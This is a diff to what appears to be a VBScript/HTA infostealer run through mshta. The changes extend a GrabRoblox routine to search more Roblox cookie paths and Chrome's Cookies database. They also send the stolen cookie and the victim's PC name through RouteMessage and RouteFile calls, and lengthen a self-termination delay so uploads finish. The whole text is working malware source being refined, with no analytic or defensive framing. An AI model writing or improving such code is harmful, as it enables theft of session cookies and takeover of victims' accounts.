@@ -34,8 +34,8 @@ For runCount = 1 To 4
     If runCount < 4 Then Call SleepMinutes(5)
 Next
 
-' --- KILL SELF (Cleanly after everything is sent) ---
-Call SleepSeconds(3)
+' --- KILL SELF (Waits 10 seconds to ensure everything uploads) ---
+Call SleepSeconds(10)
 sh.Run "taskkill /f /im mshta.exe", 0, False
 window.close()
 
@@ -59,16 +59,20 @@ End Sub
 
 ' --- GrabRoblox Function ---
 Sub GrabRoblox(isFirstGrab)
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    Dim paths(6)
+    ' Searching all known modern and legacy paths
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
     paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Network\Cookies"
+    paths(5) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    
     Dim i, fp, raw
-    For i = 0 To 4
+    For i = 0 To 5
         If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
     Next
+    
     If Len(fp) = 0 Then
         Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
         If fso.FolderExists(pk) Then
@@ -83,6 +87,7 @@ Sub GrabRoblox(isFirstGrab)
             Set folder = Nothing
         End If
     End If
+    
     If Len(fp) = 0 Then Exit Sub
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Exit Sub
@@ -115,8 +120,10 @@ Sub GrabRoblox(isFirstGrab)
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
 
-    Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
-    Call RouteFile("cookie.txt", cookie, isFirstGrab)
+    If Len(cookie) > 50 Then
+        Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
+        Call RouteFile("cookie.txt", cookie, isFirstGrab)
+    End If
 End Sub
 
 ' --- Sleep Functions ---
